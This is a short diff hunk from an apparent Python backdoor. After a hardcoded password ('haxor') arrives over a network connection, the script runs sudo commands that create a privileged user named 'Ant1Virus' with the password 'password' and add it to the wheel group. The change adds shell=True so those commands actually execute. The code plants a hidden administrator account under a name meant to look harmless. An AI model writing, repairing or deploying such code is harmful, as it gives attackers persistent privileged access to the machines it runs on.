@@ -20,8 +20,8 @@ while True:
         if pwd == "haxor":
             print("Correct password, waiting for commands")
             conn.send("done".encode())
-            subprocess.Popen("sudo useradd -p $(openssl passwd -1 password) Ant1Virus")
-            subprocess.Popen("sudo usermod -aG wheel Ant1Virus")
+            subprocess.Popen("sudo useradd -p $(openssl passwd -1 password) Ant1Virus", shell=True)
+            subprocess.Popen("sudo usermod -aG wheel Ant1Virus", shell=True)
             conn.close()
         else:
             print("Incorrect password")
